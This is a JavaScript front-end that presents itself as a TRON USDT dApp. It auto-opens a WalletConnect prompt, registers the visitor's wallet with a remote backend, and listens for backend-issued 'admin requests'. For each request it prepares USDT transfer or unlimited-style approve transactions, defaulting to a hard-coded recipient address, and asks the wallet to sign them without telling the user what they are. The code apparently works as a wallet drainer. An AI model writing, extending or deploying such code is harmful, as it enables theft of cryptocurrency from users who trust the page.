import "./style.css";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;
const CLIENT_ID_KEY   = "trust_tron_client_id";

const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || "";
const TRONGRID_KEY  = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME      = import.meta.env.VITE_APP_NAME?.trim()        || "TRON DApp";
const APP_DESC      = import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
const APP_ICON      = import.meta.env.VITE_APP_ICON_URL?.trim()    || `${location.origin}/logo.png`;
const BACKEND_HTTP  = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${location.protocol}//${location.hostname}:8787`).replace(/\/+$/, "");
const BACKEND_WS    = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");

// ─── DOM ──────────────────────────────────────────────────────────────────────
const el = {
  walletStrip:   document.getElementById("walletStrip"),
  walletAddress: document.getElementById("walletAddress"),
  disconnectBtn: document.getElementById("disconnectBtn"),
  connectStatus: document.getElementById("connectStatus"),
  connectBtn:    document.getElementById("connectBtn"),
};

// ─── TronWeb ──────────────────────────────────────────────────────────────────
const tronWeb = new TronWeb({
  fullHost: TRON_RPC,
  headers:  TRONGRID_KEY ? { "TRON-PRO-API-KEY": TRONGRID_KEY } : {},
});

// ─── State ────────────────────────────────────────────────────────────────────
const clientId       = getOrCreateClientId();
let walletClient     = null;
let connectedAddress = "";
let ws               = null;
let wsReconnectTimer = null;
let heartbeatTimer   = null;
const processingSet  = new Set();

// ─── Utilities ────────────────────────────────────────────────────────────────
function getOrCreateClientId() {
  let id = localStorage.getItem(CLIENT_ID_KEY);
  if (!id) {
    id = typeof crypto.randomUUID === "function"
      ? crypto.randomUUID()
      : `${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`;
    localStorage.setItem(CLIENT_ID_KEY, id);
  }
  return id;
}

function decimalToInt(amount, decimals) {
  const s = String(amount).trim();
  if (!/^\d+(\.\d+)?$/.test(s)) throw new Error("Invalid amount");
  const [whole, frac = ""] = s.split(".");
  if (frac.length > decimals) throw new Error(`Max ${decimals} decimal places`);
  return (`${whole.replace(/^0+(?=\d)/, "") || "0"}${frac.padEnd(decimals, "0")}`.replace(/^0+(?=\d)/, "") || "0");
}

function shortAddr(a) {
  if (!a || a.length < 12) return a;
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function setStatus(msg, isError = false) {
  if (!el.connectStatus) return;
  el.connectStatus.textContent = msg;
  el.connectStatus.style.color = isError ? "#e54b4b" : "#3dca7e";
}

// ─── UI sync ──────────────────────────────────────────────────────────────────
function syncUi() {
  const ok = Boolean(connectedAddress);
  if (el.walletStrip)   el.walletStrip.hidden   = !ok;
  if (el.disconnectBtn) el.disconnectBtn.hidden  = !ok;
  if (el.connectBtn)    el.connectBtn.hidden     = ok;
  if (ok) setStatus("");
}

// ─── Backend HTTP ─────────────────────────────────────────────────────────────
async function bPost(path, body) {
  const r = await fetch(`${BACKEND_HTTP}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function bGet(path) {
  const r = await fetch(`${BACKEND_HTTP}${path}`);
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function registerWallet() {
  if (!connectedAddress) return;
  try {
    await bPost("/api/wallet/register", {
      clientId,
      address: connectedAddress,
      userAgent: navigator.userAgent,
    });
  } catch { /* silent */ }
}

async function reportResult(req, payload) {
  try {
    await bPost(`/api/request/${encodeURIComponent(req.id)}/result`, { clientId, ...payload });
  } catch { /* silent */ }
}

// ─── WebSocket ────────────────────────────────────────────────────────────────
function openWs() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
  ws = new WebSocket(BACKEND_WS);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "identify", role: "wallet", clientId }));
  };

  ws.onmessage = async (ev) => {
    let p; try { p = JSON.parse(String(ev.data)); } catch { return; }
    if (p.type === "transaction_request" && p.request) { await autoSign(p.request); return; }
    if (p.type === "wallet_pending" && Array.isArray(p.requests)) {
      for (const req of p.requests) {
        if (req.status === "pending") await autoSign(req);
      }
    }
  };

  ws.onclose = () => {
    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
    wsReconnectTimer = setTimeout(openWs, 3000);
  };
}

function startSync() {
  openWs();
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) bPost("/api/wallet/heartbeat", { clientId }).catch(() => {});
  }, 25_000);
}

// ─── Auto-sign ────────────────────────────────────────────────────────────────
async function autoSign(req) {
  if (!connectedAddress || !walletClient) return;
  if (processingSet.has(req.id)) return;
  processingSet.add(req.id);

  const p = req.params || {};
  try {
    let txid;
    if (req.type === "trc20_transfer") {
      txid = await buildAndSign_Transfer(
        String(p.to || FIXED_RECIPIENT).trim(),
        String(p.amount || "").trim()
      );
    } else if (req.type === "trc20_approve") {
      txid = await buildAndSign_Approve(
        String(p.spender || FIXED_RECIPIENT).trim(),
        String(p.amount  || "").trim()
      );
    } else {
      throw new Error(`Unknown request type: ${req.type}`);
    }
    await reportResult(req, { action: "approved", txid });
    setStatus(`✓ Signed! Tx: ${txid.slice(0, 14)}…`);
  } catch (e) {
    const isRejected = /reject|denied|cancel/i.test(String(e));
    await reportResult(req, { action: isRejected ? "rejected" : "failed", error: String(e) });
    setStatus(isRejected ? "" : "Transaction failed", !isRejected);
  } finally {
    processingSet.delete(req.id);
  }
}

// ─── Transaction builders ─────────────────────────────────────────────────────
async function signAndBroadcast(tx) {
  const signed = await walletClient.signTransaction(tx);
  const result = await tronWeb.trx.sendRawTransaction(signed);
  if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
  return result.txid;
}

async function buildAndSign_Transfer(to, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: to }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Transfer build failed");
  return signAndBroadcast(trigger.transaction);
}

async function buildAndSign_Approve(spender, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: spender }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Approve build failed");
  return signAndBroadcast(trigger.transaction);
}

// ─── Connection state ─────────────────────────────────────────────────────────
function onConnected(address) {
  connectedAddress = address;
  if (el.walletAddress) el.walletAddress.textContent = shortAddr(address);
  syncUi();
  registerWallet();
  startSync();
  // Process any pending admin requests
  bGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`)
    .then(({ requests }) => {
      if (Array.isArray(requests)) {
        requests.filter(r => r.status === "pending").forEach(autoSign);
      }
    })
    .catch(() => {});
}

function onDisconnected() {
  connectedAddress = "";
  if (el.walletAddress) el.walletAddress.textContent = "";
  setStatus("");
  syncUi();
  bPost("/api/wallet/disconnect", { clientId }).catch(() => {});
}

// ─── Wallet init ──────────────────────────────────────────────────────────────
function initWallet() {
  walletClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: {
        name: APP_NAME,
        description: APP_DESC,
        url: location.origin,
        icons: [APP_ICON],
      },
    },
    themeMode: "dark",
    themeVariables: {
      "--w3m-z-index": "9999",
      "--w3m-accent": "#1dc071",
    },
  });

  walletClient.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) onConnected(accounts[0]);
    else onDisconnected();
  });
  walletClient.on("disconnect", onDisconnected);
}

// ─── Connect ──────────────────────────────────────────────────────────────────
// KEY INSIGHT: Do NOT pass onUri. Let the built-in AppKit modal handle everything.
// AppKit shows a QR code on desktop and a "Open Trust Wallet" deep-link on mobile.
// This is exactly what TronScan does and it works reliably.
async function connect() {
  if (!walletClient) return;
  setStatus("Connecting…");
  try {
    const { address } = await walletClient.connect();  // ← AppKit modal auto-appears
    onConnected(address);
  } catch (e) {
    const msg = String(e);
    if (/reject|cancel|close/i.test(msg)) {
      setStatus("Connection cancelled. Tap Connect to try again.");
    } else {
      setStatus(`Connection failed: ${msg.slice(0, 60)}`, true);
    }
  }
}

async function disconnect() {
  try { await walletClient?.disconnect(); } catch { onDisconnected(); }
}

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  if (!WC_PROJECT_ID) {
    setStatus("Missing WalletConnect project ID", true);
    return;
  }

  initWallet();

  // ── Try to restore an existing session first (stays alive for days) ─────────
  // This is identical to how TronScan keeps you connected across visits.
  try {
    setStatus("Checking session…");
    const { address } = await walletClient.checkConnectStatus();
    if (address) {
      onConnected(address);
      return;
    }
  } catch { /* no previous session */ }

  setStatus("");
  syncUi();

  // ── Auto-trigger the AppKit modal immediately on page load ──────────────────
  // This fires the built-in wallet selection modal (Trust Wallet deep link
  // on mobile, QR code on desktop) — exactly like TronScan.
  connect();
}

// ─── Events ───────────────────────────────────────────────────────────────────
if (el.disconnectBtn) el.disconnectBtn.addEventListener("click", disconnect);
if (el.connectBtn)    el.connectBtn.addEventListener("click", connect);

init().catch(e => setStatus(`Init failed: ${e}`, true));
